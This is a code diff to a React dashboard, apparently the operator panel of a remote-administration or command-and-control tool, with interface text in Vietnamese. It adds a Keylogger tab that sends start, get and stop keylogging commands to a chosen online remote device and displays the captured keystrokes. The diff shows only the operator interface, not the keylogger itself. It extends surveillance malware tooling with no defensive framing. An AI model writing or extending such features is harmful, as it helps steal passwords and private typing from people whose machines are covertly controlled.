@@ -18,6 +18,9 @@ function App() {
   const [fullOutput, setFullOutput] = useState(null);
   const [logs, setLogs] = useState([]);
   const [logLevel, setLogLevel] = useState('');
+  const [keylogDevice, setKeylogDevice] = useState('');
+  const [keylogData, setKeylogData] = useState('');
+  const [keylogStatus, setKeylogStatus] = useState('');
 
   const api = useCallback(() => axios.create({
     baseURL: API,
@@ -125,6 +128,7 @@ function App() {
         <nav>
           <button className={tab === 'devices' ? 'active' : ''} onClick={() => setTab('devices')}>📡 Thiet bi</button>
           <button className={tab === 'commands' ? 'active' : ''} onClick={() => setTab('commands')}>💻 Lenh</button>
+          <button className={tab === 'keylog' ? 'active' : ''} onClick={() => setTab('keylog')}>⌨️ Keylog</button>
           <button className={tab === 'logs' ? 'active' : ''} onClick={() => setTab('logs')}>📋 Logs</button>
           <button className={tab === 'alerts' ? 'active' : ''} onClick={() => setTab('alerts')}>🔔 Canh bao</button>
         </nav>
@@ -227,6 +231,62 @@ function App() {
               {commands.length === 0 && <tr><td colSpan="7" className="empty">No commands yet</td></tr>}
             </tbody>
           </table>
+        </div>
+      )}
+
+      {tab === 'keylog' && (
+        <div className="panel">
+          <h2>⌨️ Keylogger</h2>
+          <div className="keylog-toolbar">
+            <select value={keylogDevice} onChange={e => setKeylogDevice(e.target.value)}>
+              <option value="">-- Chon thiet bi --</option>
+              {devices.filter(d => d.status === 'online').map(d => (
+                <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id.slice(-8)})</option>
+              ))}
+            </select>
+            <button className="btn-keylog-start" onClick={async () => {
+              if (!keylogDevice) return;
+              setKeylogStatus('⏳ Dang bat dau...');
+              try {
+                await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_start' } });
+                setKeylogStatus('🟢 Dang ghi phim...');
+                setTimeout(() => setKeylogStatus('🟢 Dang ghi phim (nhan Get de lay du lieu)'), 2000);
+              } catch(e) { setKeylogStatus('❌ Loi: ' + e.message); }
+            }} disabled={!keylogDevice}>🔴 Start</button>
+            <button className="btn-keylog-get" onClick={async () => {
+              if (!keylogDevice) return;
+              setKeylogStatus('⏳ Dang lay du lieu...');
+              try {
+                await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_get' } });
+                setKeylogStatus('✅ Da gui lenh get, cho 3s...');
+                setTimeout(async () => {
+                  try {
+                    const r = await api().get('/api/commands', { params: { device_id: keylogDevice, limit: 1 } });
+                    const last = r.data[0];
+                    if (last && last.command_text === 'keylog_get') {
+                      setKeylogData(last.output || '(trong)');
+                      setKeylogStatus('✅ Da cap nhat');
+                    } else {
+                      setKeylogStatus('⏳ Cho them...');
+                    }
+                  } catch(e) { setKeylogStatus('❌ Loi lay du lieu'); }
+                }, 4000);
+              } catch(e) { setKeylogStatus('❌ Loi: ' + e.message); }
+            }} disabled={!keylogDevice}>📋 Get</button>
+            <button className="btn-keylog-stop" onClick={async () => {
+              if (!keylogDevice) return;
+              setKeylogStatus('⏳ Dang dung...');
+              try {
+                await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_stop' } });
+                setKeylogStatus('⏹️ Da dung');
+              } catch(e) { setKeylogStatus('❌ Loi: ' + e.message); }
+            }} disabled={!keylogDevice}>⏹️ Stop</button>
+          </div>
+          <div className="keylog-status">{keylogStatus}</div>
+          <div className="keylog-output">
+            <pre>{keylogData || 'Chua co du lieu. Nhan Start -> Get de xem.'}</pre>
+            <button className="btn-clear" onClick={() => { setKeylogData(''); setKeylogStatus(''); }}>🗑️ Xoa</button>
+          </div>
         </div>
       )}
 
